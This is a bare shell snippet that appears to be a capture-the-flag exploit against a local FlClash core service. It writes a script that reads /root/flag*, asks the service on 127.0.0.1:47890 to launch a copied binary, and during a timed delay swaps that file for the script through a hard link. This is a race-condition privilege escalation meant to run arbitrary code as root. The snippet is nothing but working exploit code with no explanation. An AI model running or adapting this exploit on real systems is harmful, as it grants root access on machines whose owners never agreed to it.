printf '#!/bin/sh\ncat /root/flag* >&2\n' > getflag.sh
chmod +x getflag.sh
rm -f foobar; cp -p FlClashCore foobar && python3 -c 'import os, requests, threading; threading.Thread(target=lambda: print(requests.post("http://127.0.0.1:47890/start", json={"path": "/tmp/foobar", "arg": "xxxx"}).text)).start(); [None for _ in range(300_000)]; os.unlink("foobar"); os.link("getflag.sh", "foobar")'; ps -ef
